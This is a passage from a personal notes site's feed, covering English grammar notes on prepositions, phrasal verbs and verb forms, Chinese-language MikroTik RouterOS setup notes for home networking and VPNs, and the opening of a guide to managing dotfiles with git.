&lt;li>&lt;code>I met a woman who can speak six languages&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>You do not need &lt;strong>that/who/which&lt;/strong> when it is the object
&lt;ul>
&lt;li>&lt;code>the people (who) we met&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h2 id="15-prepositions">15 Prepositions&lt;/h2>
&lt;p>Unit103, Unit113&lt;/p>
&lt;h3 id="151-at-on-in-time">15.1 at, on, in &lt;em>(time)&lt;/em>&lt;/h3>
&lt;blockquote>
&lt;p>Remember:&lt;/p>
&lt;ul>
&lt;li>at night/midnight etc&lt;/li>
&lt;li>in the morning/afternoon/evening&lt;/li>
&lt;li>on Tuesday morning/afternoon/evening&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>at&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>at 8 o&amp;rsquo;clock&lt;/li>
&lt;li>at night/midnight&lt;/li>
&lt;li>at the weekend(In American use &lt;strong>on the weekend&lt;/strong>)&lt;/li>
&lt;li>at Christmas(But &lt;strong>on Christmas day&lt;/strong>)&lt;/li>
&lt;li>at the end of &amp;hellip;&lt;/li>
&lt;li>at the monent&lt;/li>
&lt;li>&lt;strong>at 21&lt;/strong> (= &lt;em>at the age of 21&lt;/em>)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>on&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>On Sunday/Monday&lt;/li>
&lt;li>On Tuesday afternoon&lt;/li>
&lt;li>On 25 April&lt;/li>
&lt;li>On Christmas/New Year&amp;rsquo;s Day&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>in&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>in June/April&lt;/li>
&lt;li>in 1992/2008&lt;/li>
&lt;li>in summer/spring&lt;/li>
&lt;li>in the morning/afternoon/evening&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>don&amp;rsquo;t use &lt;strong>at/on/in&lt;/strong> before &lt;strong>this/last/next/every&lt;/strong>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/349645f77d57ae13eb9c1975729d98dc1626875677.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>in five minutes&lt;/code>, &lt;code>in a few days&lt;/code>, &lt;code>in six weeks&lt;/code> etc.
&lt;strong>&lt;code>Notice: It means a period of time from now&lt;/code>&lt;/strong>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="152-fromto-until-since-for">15.2 from&amp;hellip;to, until, since, for&lt;/h3>
&lt;ul>
&lt;li>from &amp;hellip; to/until &amp;hellip;&lt;/li>
&lt;li>until &amp;hellip; to&lt;/li>
&lt;li>since &amp;hellip;&lt;/li>
&lt;li>for + a period of time&lt;/li>
&lt;/ul>
&lt;h3 id="153-before-after-during-while">15.3 before, after, during, while&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>+ noun&lt;/strong>: &lt;code>before the film&lt;/code>, &lt;code>during the film&lt;/code>, &lt;code>after the film&lt;/code>&lt;/li>
&lt;li>&lt;strong>+ verb&lt;/strong>: &lt;code>before you go out&lt;/code>, &lt;code>while I'm reading&lt;/code>, &lt;code>after they did the shopping&lt;/code>&lt;/li>
&lt;li>Notice: &lt;strong>during&lt;/strong> + noun, &lt;strong>while&lt;/strong> + verb&lt;/li>
&lt;li>&lt;strong>before/after&lt;/strong> + doing &lt;code>before eating&lt;/code>, &lt;code>after reading&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="154-in-at-on-places-1">15.4 in, at, on &lt;em>(places 1)&lt;/em>&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>in&lt;/strong>
&lt;ul>
&lt;li>&lt;code>in bed&lt;/code>, &lt;code>in the sky&lt;/code>, &lt;code>in a big city&lt;/code>&lt;/li>
&lt;li>&lt;code>in a newspaper/book&lt;/code>, &lt;code>in a photo/picture&lt;/code>&lt;/li>
&lt;li>&lt;code>in front of&lt;/code>, &lt;code>in the middle of&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>at&lt;/strong>
&lt;ul>
&lt;li>&lt;code>at the door&lt;/code>, &lt;code>at the bus stop&lt;/code>, &lt;code>at her desk&lt;/code>&lt;/li>
&lt;li>&lt;code>at home/work&lt;/code>&lt;/li>
&lt;li>&lt;code>at the top/end/bottom of&lt;/code>&lt;/li>
&lt;li>&lt;code>at university/college&lt;/code>&lt;/li>
&lt;li>&lt;code>at the station/airport&lt;/code>&lt;/li>
&lt;li>&lt;code>at Lisa's (house)&lt;/code>, &lt;code>at the doctor's&lt;/code>&lt;/li>
&lt;li>&lt;code>at a party&lt;/code>, &lt;code>at a concert&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>on&lt;/strong>
&lt;ul>
&lt;li>&lt;code>on the left/right&lt;/code>&lt;/li>
&lt;li>&lt;code>on a bus/train/plane/ship&lt;/code>, &lt;code>on the way&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="155-to-in-at-places-2">15.5 to, in, at &lt;em>(places 2)&lt;/em>&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>go/come/return/walk&lt;/strong> (etc.) + &lt;strong>to&lt;/strong>
&lt;ul>
&lt;li>&lt;code>We are going to London&lt;/code>&lt;/li>
&lt;li>&lt;code>I went to a party last night&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>be/stay/do something&lt;/strong> (etc.) + &lt;strong>in&lt;/strong>
&lt;ul>
&lt;li>&lt;code>we lives in London&lt;/code>&lt;/li>
&lt;li>&lt;code>I like reading in bed&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>be/stay/do something&lt;/strong> (etc.) + &lt;strong>at&lt;/strong>
&lt;ul>
&lt;li>&lt;code>Sarah wasn't at work yesterday&lt;/code>&lt;/li>
&lt;li>&lt;code>Helen stayed at her brother's house&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>home&lt;/p>
&lt;ul>
&lt;li>go/home/walk &lt;strong>home&lt;/strong> (without &lt;strong>to&lt;/strong>)&lt;/li>
&lt;li>be/stay/do something &lt;strong>at home&lt;/strong>&lt;/li>
&lt;/ul>
&lt;p>arrive, get&lt;/p>
&lt;ul>
&lt;li>&lt;strong>arrive in&lt;/strong> a country or town&lt;/li>
&lt;li>&lt;strong>arrive at&lt;/strong> other places: &lt;code>arrive at the station&lt;/code>, &lt;code>arrive at work&lt;/code>&lt;/li>
&lt;li>&lt;strong>get to&lt;/strong> a place: &lt;code>What time did you get to the hotel&lt;/code>&lt;/li>
&lt;li>&lt;strong>get home&lt;/strong>, &lt;strong>arive home&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h3 id="156-under-behind-opposite-etc">15.6 under, behind, opposite &lt;em>(etc.)&lt;/em>&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>next to&lt;/strong> / &lt;strong>beside&lt;/strong> / &lt;strong>between&lt;/strong> / &lt;strong>in front of&lt;/strong> / &lt;strong>behind&lt;/strong>
&lt;ul>
&lt;li>&lt;code>A is next ot B&lt;/code> = &lt;code>A is beside B&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>opposite&lt;/strong> / &lt;strong>in front of&lt;/strong>
&lt;ul>
&lt;li>&lt;code>A is sitting opposite C&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>by&lt;/strong> (= &lt;strong>next to&lt;/strong> / &lt;strong>beside&lt;/strong>)
&lt;ul>
&lt;li>&lt;code>Our house is by the sea&lt;/code> (= beside the sea)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>under&lt;/strong>
&lt;ul>
&lt;li>&lt;code>under the table&lt;/code>, &lt;code>under a tree&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>above&lt;/strong> / &lt;strong>below&lt;/strong> (means higher or lower)
&lt;ul>
&lt;li>&lt;code>A is above the line&lt;/code>, &lt;code>B is below the line&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;p>&lt;strong>under&lt;/strong> vs &lt;strong>below&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;h3 id="157-up-over-through-etc">15.7 up, over, through &lt;em>(etc.)&lt;/em>&lt;/h3>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/51854066adf2090c9dc6a893af92d1651627096483.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;h3 id="158-on-at-by-with-about">15.8 on, at, by, with, about&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>on&lt;/strong>
&lt;ul>
&lt;li>&lt;code>on holiday&lt;/code>, &lt;code>on television&lt;/code>&lt;/li>
&lt;li>&lt;code>on the radio&lt;/code>, &lt;code>on the phone&lt;/code>&lt;/li>
&lt;li>&lt;code>on fire&lt;/code>, &lt;strong>&lt;code>on time&lt;/code>&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>at&lt;/strong>
&lt;ul>
&lt;li>&lt;code>at (the age of) 21&lt;/code>&lt;/li>
&lt;li>&lt;strong>&lt;code>A car uses more petrol at 120 kilometres an hour than at 90&lt;/code>&lt;/strong>&lt;/li>
&lt;li>&lt;code>Water boils at 100 degrees Celsius&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>by&lt;/strong>
&lt;ul>
&lt;li>&lt;code>by car/bus/plane/bike&lt;/code> but &lt;strong>&lt;code>on foot&lt;/code>&lt;/strong>&lt;/li>
&lt;li>&lt;strong>&lt;code>Have you read any books by Charles Dickens&lt;/code>&lt;/strong> (written by Charles Dickens)&lt;/li>
&lt;li>&lt;code>Who is that painting by?&lt;/code>&lt;/li>
&lt;li>&lt;code>I was bitten by a dog&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>with/without&lt;/strong>
&lt;ul>
&lt;li>&lt;code>with friends&lt;/code>, &lt;code>without me&lt;/code>&lt;/li>
&lt;li>&lt;strong>&lt;code>I cut the paper with a pair of scissors&lt;/code>&lt;/strong>&lt;/li>
&lt;li>&lt;code>a man with the beard&lt;/code>&lt;/li>
&lt;li>&lt;code>a house with a big garden&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>about&lt;/strong>
&lt;ul>
&lt;li>&lt;strong>talk/speak/think/hear/know&lt;/strong> &lt;strong>about&lt;/strong>&lt;/li>
&lt;li>&lt;strong>a book&lt;/strong> / &lt;strong>a question&lt;/strong> / &lt;strong>a programme&lt;/strong> / &lt;strong>information&lt;/strong> about&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h3 id="159-adjective--preposition">15.9 adjective + preposition&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>afraid of&lt;/strong>, &lt;strong>scared of&lt;/strong>&lt;/li>
&lt;li>&lt;strong>angry with&lt;/strong> somebody, &lt;strong>angry about&lt;/strong> something&lt;/li>
&lt;li>&lt;strong>different from&lt;/strong> (= &lt;strong>different to&lt;/strong>)&lt;/li>
&lt;li>&lt;strong>fed up with&lt;/strong>&lt;/li>
&lt;li>&lt;strong>full of&lt;/strong>&lt;/li>
&lt;li>&lt;strong>good at&lt;/strong>&lt;/li>
&lt;li>&lt;strong>interested in&lt;/strong>&lt;/li>
&lt;li>&lt;strong>married to&lt;/strong>&lt;/li>
&lt;li>&lt;strong>nice/kind of&lt;/strong> somebody to &amp;hellip;&lt;/li>
&lt;li>be &lt;strong>nice/kind to&lt;/strong> somebody&lt;/li>
&lt;li>&lt;strong>sorry about&lt;/strong>, &lt;strong>sorry for&lt;/strong>&lt;/li>
&lt;li>&lt;strong>of/at/for&lt;/strong> (etc.) + &lt;strong>-ing&lt;/strong>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/d15f87f85cf1f9cf8b0852a05e6b231d1627099574.jpg"
alt=""
/>
&lt;/p>&lt;/li>
&lt;/ul>
&lt;h3 id="1510-verb--postposition">15.10 verb + postposition&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>ask&lt;/strong> (somebody) &lt;strong>for&lt;/strong> &amp;hellip;&lt;/li>
&lt;li>&lt;strong>belong to&lt;/strong>&lt;/li>
&lt;li>&lt;strong>happen to&lt;/strong>&lt;/li>
&lt;li>&lt;strong>listen to&lt;/strong>&lt;/li>
&lt;li>&lt;strong>talk/speak to&lt;/strong> somebody (&lt;strong>about&lt;/strong> &amp;hellip;)&lt;/li>
&lt;li>&lt;strong>thank&lt;/strong> somebody &lt;strong>for&lt;/strong> &amp;hellip;&lt;/li>
&lt;li>&lt;strong>think about&lt;/strong>, &lt;strong>think of&lt;/strong>&lt;/li>
&lt;li>&lt;strong>wait for&lt;/strong>&lt;/li>
&lt;li>&lt;strong>look at&lt;/strong>, &lt;strong>look for&lt;/strong>, &lt;strong>look after&lt;/strong>&lt;/li>
&lt;li>&lt;strong>depend on&lt;/strong>&lt;/li>
&lt;/ul>
&lt;blockquote>
&lt;ul>
&lt;li>Note that we say &lt;strong>call/phone/text/email&lt;/strong> somebody(no preposition)&lt;/li>
&lt;li>Note that you can say &lt;strong>it depends what/where/how&lt;/strong> (etc.) with or without &lt;strong>on&lt;/strong>
&lt;ul>
&lt;li>&lt;em>&lt;code>It depends where you're going&lt;/code>&lt;/em> or &lt;em>&lt;code>It depends on where you're going&lt;/code>&lt;/em>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h2 id="16-phrasal-verbs">16 Phrasal verbs&lt;/h2>
&lt;p>Unit114, Unit115&lt;/p>
&lt;p>
&lt;p class="md__image">
&lt;img
src="https://img.codiy.net/english/2021-07/752263b71eda815824d1c42b59caef041627107867.jpg"
alt=""
/>
&lt;/p>&lt;/p>
&lt;ul>
&lt;li>Sometimes a phrasal verb (&lt;strong>put on&lt;/strong> / &lt;strong>take off&lt;/strong> etc.) has an &lt;strong>object&lt;/strong>
&lt;ul>
&lt;li>&lt;code>It was cold, so I put on my coat.&lt;/code> or &lt;code>I put my coat on&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>But &lt;strong>it/them&lt;/strong> (pronouns) always go before &lt;strong>on/off&lt;/strong> etc.
&lt;ul>
&lt;li>&lt;code>It was cold, so I put it on&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Some more phrasal verbs + object
&lt;ul>
&lt;li>&lt;strong>turn on&lt;/strong> / &lt;strong>turn on&lt;/strong>&lt;/li>
&lt;li>&lt;strong>switch on&lt;/strong> / &lt;strong>switch off&lt;/strong>&lt;/li>
&lt;li>&lt;strong>pick up&lt;/strong> / &lt;strong>put down&lt;/strong>&lt;/li>
&lt;li>&lt;strong>bring back&lt;/strong> / &lt;strong>take back&lt;/strong> / &lt;strong>give back&lt;/strong> / &lt;strong>put back&lt;/strong>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="17-verb-forms">17 Verb forms&lt;/h2>
&lt;h3 id="infinitive">infinitive&lt;/h3>
&lt;ul>
&lt;li>&lt;strong>to&lt;/strong> + infinitive&lt;/li>
&lt;li>&lt;strong>do/does/did&lt;/strong> + infinitive&lt;/li>
&lt;li>&lt;strong>will/may/can/should&lt;/strong> (etc.) + infinitive&lt;/li>
&lt;li>In &lt;strong>the Present Simple&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h3 id="singular--s">singular (-s)&lt;/h3>
&lt;ul>
&lt;li>In &lt;strong>the Present Simple&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h3 id="-ing">-ing&lt;/h3>
&lt;ul>
&lt;li>In &lt;strong>the Continuous Tenses&lt;/strong>
&lt;ul>
&lt;li>&lt;strong>am/is/are/was/were&lt;/strong> + -ing&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>[Unit112] [&lt;strong>adjective&lt;/strong>] + &lt;strong>preposition&lt;/strong> + -ing
&lt;ul>
&lt;li>&lt;code>good at telling stories&lt;/code>&lt;/li>
&lt;li>&lt;code>fed up with doing&lt;/code>&lt;/li>
&lt;li>&lt;code>Tom left without saying goodbye&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>some verbs&lt;/strong> + -ing&lt;/li>
&lt;li>As &lt;strong>gerund&lt;/strong>&lt;/li>
&lt;li>As &lt;strong>adjective&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h3 id="past-simple">past simple&lt;/h3>
&lt;ul>
&lt;li>In &lt;strong>the Past Tense&lt;/strong>&lt;/li>
&lt;/ul>
&lt;h3 id="past-participle">past participle&lt;/h3>
&lt;ul>
&lt;li>In &lt;strong>the Prefect tenses&lt;/strong>&lt;/li>
&lt;li>In &lt;strong>Passive&lt;/strong> Sentences&lt;/li>
&lt;li>As &lt;strong>adjective&lt;/strong>&lt;/li>
&lt;/ul></description></item><item><title>Docs: ROS Settings</title><link>https://note.codiy.net/docs/2022/01/ros-settings/</link><pubDate>Wed, 05 Jan 2022 11:42:08 +0800</pubDate><guid>https://note.codiy.net/docs/2022/01/ros-settings/</guid><description>
&lt;h2 id="基础设定">基础设定&lt;/h2>
&lt;ul>
&lt;li>设置IP地址&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ip address
add address=192.168.1.1/24 comment=&amp;quot;default configuration&amp;quot; interface=lan1 network=192.168.1.0
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>PPPOE 拨号上网&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/interface ethernet
set [ find default-name=ether1 ] name=lan1
set [ find default-name=ether2 ] name=wan1
/interface pppoe-client add name=pppoe interface=wan1 user=xxxx password=yyyy add-default-route=yes disabled=no
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>开启IP伪装共享上网(源地址为本局域网IP的IP数据包, 统一替换为路由器公网IP)&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ip firewall nat add chain=srcnat action=masquerade
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>设置DNS&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ip dns
set allow-remote-requests=yes servers=218.85.157.99,218.85.152.99
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>配置 dhcp 服务&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ip pool add name=dhcp_pool0 ranges=192.168.1.5-192.168.1.253
/ip dhcp-server
add name=dhcp interface=lan1 address-pool=dhcp_pool0 lease-time=10m
/ip dhcp-server network
add address=192.168.1.0/24 gateway=192.168.1.2 dns-server=218.85.157.99,218.85.152.99 netmask=24
&lt;/code>&lt;/pre>&lt;h2 id="安全设定">安全设定&lt;/h2>
&lt;ul>
&lt;li>关闭不需要的服务&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ip service
set telnet disabled=yes
set ftp disabled=yes
set api disabled=yes
set winbox disabled=yes
set api-ssl disabled=yes
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>防火墙规则&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ip firewall filter
add action=drop chain=input dst-port=53 in-interface=pppoe protocol=udp
add action=drop chain=input dst-port=53 in-interface=pppoe protocol=tcp
add action=drop chain=input comment=&amp;quot;Drop Invalid Connections&amp;quot; connection-state=invalid
add action=accept chain=input comment=&amp;quot;Allow Established Connections&amp;quot; connection-state=established
add action=accept chain=input comment=&amp;quot;Allow ICMP&amp;quot; protocol=icmp
add action=accept chain=input in-interface=lan1 src-address=192.168.1.0/24
add action=drop chain=input comment=&amp;quot;Drop Everything Else&amp;quot;
add action=accept chain=output comment=&amp;quot;Accept Everything&amp;quot;
add action=drop chain=forward comment=&amp;quot;Drop Invalid Connections&amp;quot; connection-state=invalid
add action=accept chain=forward comment=&amp;quot;Allow Established Connections&amp;quot; connection-state=established
add action=accept chain=forward comment=&amp;quot;Allow Related Connections&amp;quot; connection-state=related
add action=jump chain=forward jump-target=tcp protocol=tcp
add action=jump chain=forward jump-target=udp protocol=udp
add action=jump chain=forward jump-target=icmp protocol=icmp
add action=drop chain=input comment=&amp;quot;Forbid Ping&amp;quot; protocol=icmp src-address=!192.168.1.0/24
&lt;/code>&lt;/pre>&lt;h2 id="ddns">DDNS&lt;/h2>
&lt;pre tabindex="0">&lt;code>/system script
add comment=script_ddns dont-require-permissions=no name=script_ddns owner=admin policy=\
ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon source=&amp;quot;:local domain \&amp;quot;codiy.net\&amp;quot;\
\n:local record \&amp;quot;www\&amp;quot;\
\n:local pppoe \&amp;quot;pppoe\&amp;quot;\
\n\
\n:local ipaddr [/ip address get [/ip address find interface=\$pppoe] address]\
\n:set ipaddr [:pick \$ipaddr 0 ([len \$ipaddr] -3)]\
\n:global ddnsipv4\
\n:if (\$ipaddr != \$ddnsipv4) do={\
\n :local result [/tool fetch url=\&amp;quot;https://api.codiy.net/api/tools/ddns\\\?domain=\$domain&amp;amp;rr=\$record&amp;amp;ip=\$ip\
addr\&amp;quot; as-value output=user];\
\n :if (\$result-&amp;gt;\&amp;quot;status\&amp;quot; = \&amp;quot;finished\&amp;quot;) do={\
\n :if (\$result-&amp;gt;\&amp;quot;data\&amp;quot; = \&amp;quot;0\&amp;quot;) do={\
\n :set ddnsipv4 \$ipaddr\
\n :log info \&amp;quot;alidns update ok\&amp;quot;;\
\n } else={\
\n :log info \&amp;quot;alidns update error\&amp;quot;;\
\n }\
\n }\
\n}&amp;quot;
&lt;/code>&lt;/pre>&lt;h2 id="回流端口转发">回流+端口转发&lt;/h2>
&lt;ul>
&lt;li>添加 NAT 规则, 目标地址为本机公网IP的数据包, 都直接转给下一规则 post-nat&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ip firewall nat
add action=jump chain=dstnat comment=dynamic_nat dst-address=100.64.71.98 jump-target=port-nat
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>动态设置 dst-address 的脚本&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>add dont-require-permissions=no name=script_dynamic_nat owner=admin policy=\
ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon source=&amp;quot;:global dnatold\
\n\
\n:global dnatnew\
\n\
\n:set dnatnew [/interface get [/interface find name=\&amp;quot;pppoe\&amp;quot;] running]\
\n\
\n:if (\$dnatnew=true) do={\
\n\
\n:set dnatold [/ip address get [/ip address find dynamic=yes interface=\&amp;quot;pppoe\&amp;quot;] address]\
\n\
\n:set dnatold [:pick \$dnatold 0 ([:len \$dnatold ] -3)]\
\n\
\n/ip firewall nat set [/ip firewall nat find comment=\&amp;quot;dynamic_nat\&amp;quot;] dst-address=\$dnatold\
\n\
\n}\
\n\
\n&amp;quot;
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>添加 profile 让 pppoe 拨号时候自动触发脚本&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ppp profile
add change-tcp-mss=yes name=pppoe-client-profile on-up=&amp;quot;delay 3s\
\n:execute \&amp;quot;script_dynamic_nat\&amp;quot;&amp;quot;
/interface pppoe-client set profile=pppoe-client-profile [find name=&amp;quot;pppoe&amp;quot;]
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>添加端口转发规则&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ip firewall nat
add action=dst-nat chain=port-nat comment=&amp;quot;nas port nat&amp;quot; dst-port=5000 protocol=tcp to-addresses=192.168.1.3 to-ports=5000
&lt;/code>&lt;/pre>&lt;h2 id="upnp">Upnp&lt;/h2>
&lt;pre tabindex="0">&lt;code>/ip upnp
set allow-disable-external-interface=yes enabled=yes
/ip interfaces
add interface=pppoe type=external
add interface=lan1 type=internal
&lt;/code>&lt;/pre>&lt;h2 id="vpn设定">VPN设定&lt;/h2>
&lt;ul>
&lt;li>L2TP&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/ppp profile
add name=l2tp-profile use-encryption=yes
/ppp secret
add local-address=10.0.0.1 name=codiy password=xxxxx profile=l2tp-profile remote-address=10.0.0.2 service=l2tp
/interface l2tp-server server
set default-profile=l2tp-profile enabled=yes use-ipsec=yes
&lt;/code>&lt;/pre>&lt;h2 id="vpn-ikev2">VPN IKEV2&lt;/h2>
&lt;h3 id="certificationshttpshelpmikrotikcomdocsdisplayroscertificates">&lt;a href="https://help.mikrotik.com/docs/display/ROS/Certificates">certifications&lt;/a>&lt;/h3>
&lt;ul>
&lt;li>新增&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/certificate
add name=CA digest-algorithm=sha256 key-type=rsa common-name=CA key-size=2048 subject-alt-name=&amp;quot;&amp;quot; days-valid=3650 trusted=yes
add name=Server digest-algorithm=sha256 key-type=rsa common-name=Server key-size=2048 subject-alt-name=&amp;quot;&amp;quot;
days-valid=3650 trusted=yes key-usage=tls-server ca=CA
add name=&amp;quot;Client&amp;quot; digest-algorithm=sha256 key-type=rsa common-name=&amp;quot;Client&amp;quot; key-size=2048 subject-alt-name=&amp;quot;&amp;quot;
days-valid=3650 trusted=yes key-usage=tls-client ca=CA
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>签名&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/certificate
sign CA-Template
sign Client
sign Server ca-crl-host=192.168.88.1 name=ServerCA
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>导出&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>/certificate
export-certificate CA-Template
export-certificate ServerCA export-passphrase=yourpassphrase
export-certificate Client export-passphrase=yourpassphrase
&lt;/code>&lt;/pre>&lt;h3 id="ikev2-setup">IKEV2 Setup&lt;/h3>
&lt;pre tabindex="0">&lt;code>/ip pool
add name=ikev2_pool ranges=10.0.0.1-10.0.0.6
/ip ipsec mode-config
add address-pool=ikev2_pool address-prefix-length=29 name=ikev2-cfg static-dns=192.168.1.1 system-dns=no
/ip ipsec policy group
add name=ikev2-group
/ip ipsec profile
add enc-algorithm=aes-256,aes-128 hash-algorithm=sha256 name=ikev2-profile
/ip ipsec peer
add exchange-mode=ike2 name=ikev2-peer passive=yes profile=ikev2-profile send-initial-contact=no
/ip ipsec proposal
add auth-algorithms=sha256,sha1 enc-algorithms=aes-256-cbc,aes-128-cbc lifetime=23h59m59s name=ikev2-proposal
/ip ipsec identity
add auth-method=digital-signature certificate=Server generate-policy=port-strict match-by=certificate mode-config=\
ikev2-cfg my-id=fqdn:Server peer=ikev2-peer policy-template-group=ikev2-group remote-certificate=Client
/ip ipsec policy
add dst-address=10.0.0.0/29 group=ikev2-group proposal=ikev2-proposal src-address=0.0.0.0/0 template=yes
&lt;/code>&lt;/pre></description></item><item><title>Docs: How I Manage My Dotfiles</title><link>https://note.codiy.net/docs/2021/12/how-i-manage-my-dotfiles/</link><pubDate>Wed, 29 Dec 2021 16:09:48 +0800</pubDate><guid>https://note.codiy.net/docs/2021/12/how-i-manage-my-dotfiles/</guid><description>
&lt;h2 id="1-what-is-dofiles">1. What is dofiles&lt;/h2>
&lt;p>The definition by archlinux, User-specific application configuration is traditionally stored in
so called dotfiles (files whose filename starts with a dot). Some of them listed below:&lt;/p>
&lt;ul>
&lt;li>.vimrc&lt;/li>
&lt;li>.tmux.conf&lt;/li>
&lt;li>.gitconfig&lt;/li>
&lt;li>.ssh/&lt;/li>
&lt;li>.aws/&lt;/li>
&lt;li>.gnupg/&lt;/li>
&lt;li>.config/&lt;/li>
&lt;/ul>
&lt;p>Those &lt;strong>dotfiles&lt;/strong> are all located in your home directory.&lt;/p>
&lt;h2 id="2-best-way-to-manage-dotfiles">2. Best way to manage dotfiles&lt;/h2>
&lt;p>&lt;em>&lt;strong>&lt;a href="https://wiki.archlinux.org/title/Dotfiles#Tracking_dotfiles_directly_with_Git">Bare repository and alias method&lt;/a>&lt;/strong>&lt;/em> is the best way to keep track of changes and synchronize
your dotfiles between hosts.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-shell" data-lang="shell">git init --bare ~/.dotfiles
&lt;span style="color:#658b00">alias&lt;/span> &lt;span style="color:#00688b">got&lt;/span>=&lt;span style="color:#cd5555">&amp;#39;/usr/bin/git --git-dir=$HOME/.dotfiles/ --work-tree=$HOME&amp;#39;&lt;/span>
got config status.showUntrackedFiles no
&lt;/code>&lt;/pre>&lt;/div>&lt;p>and then you can manage your dotfiles with alias command &lt;code>got&lt;/code> just like use &lt;code>git&lt;/code> command.&lt;/p>
&lt;p>Now you can manage your dotfiles with git and you may push your repository to &lt;a href="https://github.com">github.com&lt;/a>.
And you want to shared your dotfiles with others, so you have to make your repository public on github.
Hold on! what about the files in directory like &lt;code>.ssh/&lt;/code>, they can&amp;rsquo;t be made public.&lt;/p>
&lt;h2 id="3-how-to-manage-the-secrets-of-dotfiles">3. How to manage the secrets of dotfiles&lt;/h2>
&lt;p>Some of dotfiles can be made public (.vimrc, .tmux.conf etc.) and the others only known by yourself
(.ssh/ .aws/ etc.). We can use &lt;em>&lt;strong>gnupg&lt;/strong>&lt;/em> and a &lt;em>&lt;strong>private git repository&lt;/strong>&lt;/em> to manage them.&lt;/p>
